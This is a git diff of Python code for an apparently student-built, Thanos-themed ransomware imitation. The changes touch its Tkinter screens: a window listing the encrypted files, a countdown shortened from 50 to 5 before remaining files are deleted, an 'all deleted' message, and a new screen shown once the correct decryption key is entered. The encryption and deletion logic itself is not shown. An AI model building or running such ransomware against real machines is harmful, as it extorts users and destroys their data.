@@ -21,6 +21,7 @@ iv = os.urandom(16)
 
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
 
+
 class tk:
     def __init__(self, parent=None):
         self.parent = parent
@@ -72,15 +73,15 @@ class tk:
         self.parent and self.parent.checkPassword(self.pw)
         # self.pwbutton.destroy()
 
-    def imagechange(self):
+    def imagechange(self): # from HY
         # gif 출력
         self.l_thanos.destroy()
-        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")  ##self.window로 수정
+        self.l_thanos = thanos.AnimatedGIF(self.window, "../ui/thanos1.gif")    ##self.window로 수정
         self.l_thanos.pack()
         # 다시 타노스얼굴 사진
         sleep(2)
         self.l_thanos.destroy()
-        self.l_thanos = tkinter.Label(self.window, image=self.thanos)  ##self.window로 수정 #self.thanos로 수정
+        self.l_thanos = tkinter.Label(self.window, image=self.thanos)    ##self.window로 수정 #self.thanos로 수정
         self.l_thanos.pack()
 
 
@@ -136,15 +137,22 @@ def startTimer(gui, path, ext=None):
     # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
     # 지운 파일 출력 #새창으로 띄우기
     gui.listWindow = tkinter.Toplevel(gui.window)
-    gui.listWindow.title('암호화된 파일 리스트')
+    gui.listWindow.title('암호화된 파일 리스트(남은 파일 리스트)')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
-    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(antdd_filelist) + "]", background="black", fg="red")
+
+    ###유지 요구사항 이번에 수정함....###리스트 세로로 출력
+    gui.list = tkinter.Label(gui.listWindow, text="[" + ",\n".join(antdd_filelist) + "]", background="black", fg="red")
     gui.list.pack()
-    ####
+    ###
     print("[" + ",".join(antdd_filelist) + "]")
 
-    clock(gui, 50, antdd_filelist)
+    clock(gui, 5, antdd_filelist)
+
+    ### list gui 자동으로 삭제 ###
+    sleep(3)
+    gui.listWindow.destroy()
+    ###
 
 
 # 타이머를 출력해주는 함수
@@ -163,16 +171,32 @@ def clock(gui, c, antdd_filelist):
     # 자기 자신 호출
     threading.Timer(1, clock, [gui, c, antdd_filelist]).start()
 
-
 # 모두 삭제되었을 때 GUI #혜연 11/22 추가
 def allRemovePrint(gui):
     gui.l_thanos.destroy()
     l_allremove = tkinter.Label(gui.window, text="\n\nYour files are all deleted.\n\n",
-                                fg="red", bg="black", font='Helvetica 16 bold')
+                               fg="red", bg="black", font='Helvetica 16 bold')
     l_allremove.pack()
     sleep(3)
     gui.window.destroy()
 
+###올바른 키를 입력했을 때 GUI
+def inputCorrectKeyGUI(gui):
+    #window 내용 삭제
+    gui.l_timer.destroy()
+    gui.l_input.destroy()
+    gui.password.destroy()
+    gui.pwbutton.destroy()
+
+    gui.l_text.config(text="\n고맙습니다 고갱님^^ 복호화 완료되었습니당~!\n\n", font='Helvetica 16 bold')
+    gui.doneImage = tkinter.PhotoImage(file="../ui/doneThanos.jpg")
+    gui.l_thanos.destroy()
+    gui.l_thanos = tkinter.Label(gui.window, image=gui.doneImage)  ##self.window로 수정 #self.thanos로 수정
+    gui.l_thanos.pack()
+
+    sleep(5)
+    gui.window.destroy()
+###
 
 def remove_files(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
